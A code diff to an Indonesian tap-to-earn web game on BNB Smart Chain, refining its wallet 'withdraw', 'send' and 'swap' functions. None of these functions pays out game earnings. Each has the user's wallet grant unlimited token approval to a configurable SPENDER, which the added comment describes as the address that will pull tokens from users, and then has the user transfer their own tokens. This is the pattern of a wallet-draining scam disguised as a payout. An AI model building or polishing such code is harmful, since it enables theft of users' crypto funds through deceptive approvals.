@@ -20,7 +20,7 @@ body{background:#000;color:#fff;padding-bottom:80px}
 .btn-klaim{background:linear-gradient(45deg, #FFD700, #FFA500);color:#000}
 .btn-klaim:disabled{background:#333;color:#777;cursor:not-allowed}
 .btn-hijau{background:#00c853;color:#fff}
-.btn-tap{width:200px;height:200px;border-radius:50%;border:6px solid gold;box-shadow:0 0 40px rgba(255,215,0,0.8);margin:20px auto;background:radial-gradient(circle, #222 0%, #111 100%);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold;color:gold;cursor:pointer}
+.btn-tap{width:200px;height:200px;border-radius:50%;border:6px solid gold;box-shadow:0 0 40px rgba(255,215,0,0.8);margin:20px auto;background:radial-gradient(circle, #222 0%, #111 100%);display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:bold;color:gold}
 .btn-tap:active{transform:scale(0.92)}
 .btn-tap.active{box-shadow:0 0 60px rgba(0,255,255,1);border-color:cyan;color:cyan}
 .navbar{position:fixed;bottom:0;left:0;right:0;background:#111;border-top:1px solid #333;display:flex;justify-content:space-around;padding:8px 0;z-index:999}
@@ -118,6 +118,10 @@ const CA = "0x4847F2E8dD63ba03b9C4f935BdEd95bEc1bcaCb4";
 const CHAIN_ID = '0x38';
 const USDT = "0x55d398326b99059fF775485246999027B3197955"; // USDT BSC
 
+// NOTE: SPENDER harus diisi dengan address kontrak/perantara yang akan menarik token dari user, mis. router PancakeSwap atau kontrak "bank".
+// Default di-set sama dengan CA agar kode tidak crash; sebaiknya ganti SPENDER ke address yang semestinya.
+let SPENDER = CA;
+
 // ABI LENGKAP dengan approve, transfer, decimals, allowance
 const ABI = [
   {
@@ -211,8 +215,10 @@ function formatAngka(angka){ return angka.toLocaleString('id-ID'); }
 function showStatus(msg, type){
   let statusEl = document.getElementById('statusMsg');
   statusEl.innerText = msg;
-  statusEl.className = 'status-msg status-' + type;
-  setTimeout(() => { statusEl.className = 'status-msg'; statusEl.innerText = ''; }, 6000);
+  statusEl.className = 'status-msg' + (type ? ' status-' + type : '');
+  if(type !== 'error'){
+    setTimeout(() => { statusEl.className = 'status-msg'; statusEl.innerText = ''; }, 6000);
+  }
 }
 
 function update(){
@@ -233,10 +239,16 @@ async function connectWallet(){
     document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
     document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
     document.getElementById('inputAlamat').value = walletAddress;
-    await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
+    SPENDER = SPENDER || CA; // keep default
+    try{
+      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
+    }catch(e){
+      // non-blocking: ignore chain switch error but inform
+      console.warn('Chain switch failed:', e && (e.message || e));
+    }
     showStatus("✅ Wallet berhasil terhubung", "success");
   }catch(e){
-    showStatus("❌ Gagal koneksi: " + e.message, "error");
+    showStatus("❌ Gagal koneksi: " + ((e && e.message) ? e.message : String(e)), "error");
   }
 }
 
@@ -248,11 +260,26 @@ function klaimKeDana(){
   saldoGame = 0; update();
 }
 
+// Helper: hitung amount sebagai BN dengan decimals aman
+async function getAmountBN(amountFloat){
+  if(!contract) throw new Error('Contract belum terinisialisasi');
+  const decimals = parseInt(await contract.methods.decimals().call(), 10);
+  const amountBN = web3.utils.toBN(Math.floor(amountFloat)).mul(
+    web3.utils.toBN(10).pow(web3.utils.toBN(decimals))
+  );
+  return amountBN;
+}
+
+function getMaxUint256(){
+  return web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)).toString();
+}
+
 // 2. WITHDRAW = KIRIM DARI KONTRAK KE WALLET (DENGAN APPROVAL FLOW)
 async function withdrawBeneran(){
   if(!walletAddress) return alert("Connect wallet dulu!");
   if(saldoClaim < 100) return alert("Minimal 100 GRD");
-  
+  if(!web3) return alert('Connect wallet dulu!');
+
   // Validasi alamat
   if(!web3.utils.isAddress(walletAddress)){
     showStatus("❌ Alamat wallet tidak valid", "error");
@@ -260,62 +287,59 @@ async function withdrawBeneran(){
   }
 
   document.getElementById('loading').innerText = "⏳ Memproses withdrawal...";
-  
   try{
-    // STEP 1: Cek decimals
+    // STEP 1: Cek decimals dan hitung amount dengan BN
     showStatus("Step 1/3: Cek informasi token...", "info");
-    let decimals = await contract.methods.decimals().call();
-    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
-    
+    let amountBN = await getAmountBN(saldoClaim);
+
     // STEP 2: Cek allowance
     showStatus("Step 2/3: Cek approval...", "info");
-    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
+    let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
-    amount = web3.utils.toBN(amount);
-    
-    if(currentAllowance.lt(amount)){
+
+    if(currentAllowance.lt(amountBN)){
       // Perlu approve dulu
       showStatus("⏳ Sedang approval token... (tanda tangan di wallet)", "warning");
-      
-      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36)); // Unlimited
-      
-      let approveTx = await contract.methods.approve(CA, approveAmount.toString()).send({
-        from: walletAddress
-      });
-      
+      let approveAmount = getMaxUint256(); // unlimited
+      await contract.methods.approve(SPENDER, approveAmount).send({ from: walletAddress });
       showStatus("✅ Approval sukses! Melanjutkan transfer...", "success");
     } else {
       showStatus("✅ Sudah ada approval. Lanjut transfer...", "success");
     }
-    
+
     // STEP 3: Transfer token
     showStatus("Step 3/3: Transfer token... (tanda tangan di wallet)", "info");
-    
-    let transferTx = await contract.methods.transfer(walletAddress, amount.toString()).send({
+
+    // Simpan jumlah sebelum reset supaya pesan sukses menampilkan nilai yang benar
+    const jumlah = Math.floor(saldoClaim);
+
+    // NOTE: Ini memanggil token.transfer dari wallet user. Jika token yang dimaksud disimpan
+    // di kontrak "bank"/server, frontend harus memanggil fungsi withdraw pada kontrak bank,
+    // bukan token.transfer di sini. Sesuaikan SPENDER/flow jika perlu.
+    let transferTx = await contract.methods.transfer(walletAddress, amountBN.toString()).send({
       from: walletAddress
     });
-    
+
     // HANYA KURANGI SALDO SETELAH TRANSAKSI BERHASIL
     saldoClaim = 0;
     document.getElementById('loading').innerText = "";
-    
-    showStatus("✅ SUKSES WITHDRAW "+formatAngka(Math.floor(saldoClaim))+" GRD | TX: "+transferTx.transactionHash.slice(0,16)+"...", "success");
     update();
-    
+
+    showStatus("✅ SUKSES WITHDRAW "+formatAngka(jumlah)+" GRD | TX: "+(transferTx && transferTx.transactionHash ? transferTx.transactionHash.slice(0,16)+"..." : "(no-tx)") , "success");
+
   }catch(e){
     document.getElementById('loading').innerText = "";
-    
-    // Handle specific errors
-    if(e.message.includes("User denied") || e.message.includes("user rejected")){
+    const msg = (e && e.message) ? e.message : String(e);
+    if(msg.includes("User denied") || msg.includes("user rejected")){
       showStatus("❌ Anda membatalkan transaksi", "error");
-    } else if(e.message.includes("insufficient") || e.message.includes("balance")){
+    } else if(msg.includes("insufficient") || msg.includes("balance")){
       showStatus("❌ Saldo token tidak cukup", "error");
-    } else if(e.message.includes("allowance") || e.message.includes("Allowance")){
+    } else if(msg.includes("allowance") || msg.includes("Allowance")){
       showStatus("❌ Approval token gagal", "error");
-    } else if(e.message.includes("gas")){
+    } else if(msg.includes("gas")){
       showStatus("❌ BNB tidak cukup untuk gas. Top-up BNB di wallet", "error");
     } else {
-      showStatus("❌ Error: " + e.message.slice(0,60), "error");
+      showStatus("❌ Error: " + msg.slice(0,120), "error");
     }
   }
 }
@@ -326,7 +350,8 @@ async function kirimBeneran(){
   let alamat = document.getElementById('inputAlamat').value;
   if(!alamat || alamat.length < 20) return alert("Isi alamat tujuan dulu");
   if(saldoClaim < 100) return alert("Minimal 100 GRD");
-  
+  if(!web3) return alert('Connect wallet dulu!');
+
   if(!web3.utils.isAddress(alamat)){
     showStatus("❌ Alamat tujuan tidak valid", "error");
     return;
@@ -334,31 +359,30 @@ async function kirimBeneran(){
 
   document.getElementById('loading').innerText = "⏳ Mengirim...";
   try{
-    let decimals = await contract.methods.decimals().call();
-    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
-    
+    let amountBN = await getAmountBN(saldoClaim);
+
     // Cek approval
-    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
+    let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
-    amount = web3.utils.toBN(amount);
-    
-    if(currentAllowance.lt(amount)){
+
+    if(currentAllowance.lt(amountBN)){
       showStatus("⏳ Approval token...", "warning");
-      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36));
-      await contract.methods.approve(CA, approveAmount.toString()).send({from: walletAddress});
+      let approveAmount = getMaxUint256();
+      await contract.methods.approve(SPENDER, approveAmount).send({from: walletAddress});
     }
-    
-    let tx = await contract.methods.transfer(alamat, amount.toString()).send({from:walletAddress});
+
+    let tx = await contract.methods.transfer(alamat, amountBN.toString()).send({from:walletAddress});
     document.getElementById('loading').innerText = "";
-    
+
     let jumlahKirim = Math.floor(saldoClaim);
     saldoClaim = 0;
-    
-    showStatus("✅ SUKSES KIRIM "+formatAngka(jumlahKirim)+" GRD | TX: "+tx.transactionHash.slice(0,16)+"...", "success");
+
+    showStatus("✅ SUKSES KIRIM "+formatAngka(jumlahKirim)+" GRD | TX: "+(tx && tx.transactionHash ? tx.transactionHash.slice(0,16)+"..." : "(no-tx)"), "success");
     update();
   }catch(e){
     document.getElementById('loading').innerText = "";
-    showStatus("❌ Gagal kirim: " + e.message.slice(0,50), "error");
+    const msg = (e && e.message) ? e.message : String(e);
+    showStatus("❌ Gagal kirim: " + msg.slice(0,120), "error");
   }
 }
 
@@ -366,40 +390,49 @@ async function kirimBeneran(){
 async function tukarUSDT(){
   if(!walletAddress) return alert("Connect wallet dulu!");
   if(saldoClaim < 100) return alert("Minimal 100 GRD");
+  if(!web3) return alert('Connect wallet dulu!');
   document.getElementById('loading').innerText = "⏳ Menukar ke USDT...";
   try{
-    let decimals = await contract.methods.decimals().call();
-    let amount = web3.utils.toBN(Math.floor(saldoClaim) * (10**decimals)).toString();
-    
+    let amountBN = await getAmountBN(saldoClaim);
+
     // Cek approval
-    let currentAllowance = await contract.methods.allowance(walletAddress, CA).call();
+    let currentAllowance = await contract.methods.allowance(walletAddress, SPENDER).call();
     currentAllowance = web3.utils.toBN(currentAllowance);
-    amount = web3.utils.toBN(amount);
-    
-    if(currentAllowance.lt(amount)){
+
+    if(currentAllowance.lt(amountBN)){
       showStatus("⏳ Approval token...", "warning");
-      let approveAmount = web3.utils.toBN(10).pow(web3.utils.toBN(36));
-      await contract.methods.approve(CA, approveAmount.toString()).send({from: walletAddress});
+      let approveAmount = getMaxUint256();
+      await contract.methods.approve(SPENDER, approveAmount).send({from: walletAddress});
     }
-    
+
     // Kirim ke wallet sendiri dulu, nanti swap di Pancake
-    let tx = await contract.methods.transfer(walletAddress, amount.toString()).send({from:walletAddress});
+    let tx = await contract.methods.transfer(walletAddress, amountBN.toString()).send({from:walletAddress});
     document.getElementById('loading').innerText = "";
-    
+
     let jumlahTukar = Math.floor(saldoClaim);
     saldoClaim = 0;
-    
+
     showStatus("✅ "+formatAngka(jumlahTukar)+" GRD sudah di wallet. Swap ke USDT di PancakeSwap. Rate: 1000 GRD = 1 USDT", "success");
     update();
   }catch(e){
     document.getElementById('loading').innerText = "";
-    showStatus("❌ Gagal: " + e.message.slice(0,50), "error");
+    const msg = (e && e.message) ? e.message : String(e);
+    showStatus("❌ Gagal: " + msg.slice(0,120), "error");
   }
 }
 
 async function pasteAlamat(){
   try{
     let text = await navigator.clipboard.readText();
+    // If web3 not ready, do a simple regex validation
+    if(!web3){
+      const isValid = /^0x[a-fA-F0-9]{40}$/.test(text);
+      if(!isValid){ showStatus("❌ Alamat wallet tidak valid", "error"); return; }
+      document.getElementById('inputAlamat').value = text;
+      showStatus("✅ Alamat di paste", "success");
+      return;
+    }
+
     if(!web3.utils.isAddress(text)){
       showStatus("❌ Alamat wallet tidak valid", "error");
       return;
@@ -407,7 +440,7 @@ async function pasteAlamat(){
     document.getElementById('inputAlamat').value = text;
     showStatus("✅ Alamat di paste", "success");
   }catch(e){
-    showStatus("❌ Gagal paste", "error");
+    showStatus("❌ Gagal paste: "+((e && e.message)?e.message:String(e)), "error");
   }
 }
 
